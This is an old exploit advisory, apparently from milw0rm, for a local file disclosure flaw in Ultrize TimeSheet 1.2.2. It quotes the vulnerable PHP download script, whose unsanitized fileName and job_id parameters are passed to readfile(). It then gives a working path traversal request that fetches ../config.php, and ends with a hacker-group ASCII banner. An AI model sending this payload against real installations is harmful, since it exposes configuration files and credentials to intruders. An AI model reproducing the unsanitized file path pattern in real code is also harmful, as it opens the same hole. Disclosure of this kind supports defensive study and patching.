@@ -1,0 +1,49 @@
+Ultrize TimeSheet 1.2.2 readfile() Local File Disclosure Vulnerability
+Code page  /actions/downloadFile.php
+
+====
+<?php
+//** This script performs the actual file download
+
+$fileName = $_REQUEST['fileName']; <--!!
+$job_id = $_REQUEST['job_id']; <--!!
+$fullFile = $config['upload_dir'].$job_id.'/'.$fileName; <--!!
+
+if (file_exists($fullFile))
+{
+    header("Content-Type: application/octet-stream");
+    header("Content-Length: ".filesize($fullFile));
+
+    header('Content-Disposition: attachment; fileName="'.$fileName.'"');
+
+    readfile($fullFile); <--!!
+}
+else
+{
+    header("HTTP/1.0 404 Not Found");
+    print "<h1>File not found. </h1>";
+    print $fileName;
+    print "<hr>Please make sure your file paths are correct: {$config['upload_dir']}/{$job_id}/$fileName}<br />";
+}
+
+?>
+====
+
+Poc
+/actions/downloadFile.php?fileName=../config.php
+
+          .___________..______     ____    ____  ___       _______   
+           |           ||   _  \    \   \  /   / /   \     /  _____|  
+           `---|  |----`|  |_)  |    \   \/   / /  ^  \   |  |  __    
+               |  |     |      /      \_    _/ /  /_\  \  |  | |_ |   
+               |  |     |  |\  \----.   |  |  /  _____  \ |  |__| |   
+               |__|     | _| `._____|   |__| /__/     \__\ \______|   
+                                                             
+       ___       ______     ___       _______   _______ .___  ___. ____    ____   
+      /   \     /      |   /   \     |       \ |   ____||   \/   | \   \  /   /   
+     /  ^  \   |  ,----'  /  ^  \    |  .--.  ||  |__   |  \  /  |  \   \/   /    
+    /  /_\  \  |  |      /  /_\  \   |  |  |  ||   __|  |  |\/|  |   \_    _/     
+   /  _____  \ |  `----./  _____  \  |  '--'  ||  |____ |  |  |  |     |  |       
+  /__/     \__\ \______/__/     \__\ |_______/ |_______||__|  |__|     |__|  
+
+# milw0rm.com [2009-07-30]
